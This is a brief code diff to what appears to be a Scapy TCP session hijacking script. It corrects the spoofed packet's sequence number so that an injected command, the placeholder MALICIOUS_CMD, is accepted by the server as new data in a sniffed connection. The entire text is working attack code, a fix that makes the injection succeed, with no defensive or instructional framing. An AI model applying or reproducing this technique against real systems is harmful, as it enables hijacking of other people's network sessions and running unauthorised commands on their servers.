@@ -32,13 +32,17 @@ def hijack(pkt):
     ip_layer  = pkt[IP]
     tcp_layer = pkt[TCP]
 
+    # Advance seq past the sniffed payload so the server treats the
+    # injected data as new bytes, not a retransmission or overlap.
+    next_seq = tcp_layer.seq + len(tcp_layer[Raw])
+
     # Build a spoofed ACK packet with the injected payload
     ip  = IP(src=ip_layer.src, dst=ip_layer.dst)
     tcp = TCP(
         sport=tcp_layer.sport,
         dport=tcp_layer.dport,
         flags="A",
-        seq=tcp_layer.seq,
+        seq=next_seq,
         ack=tcp_layer.ack,
     )
     spoof_pkt = ip / tcp / MALICIOUS_CMD
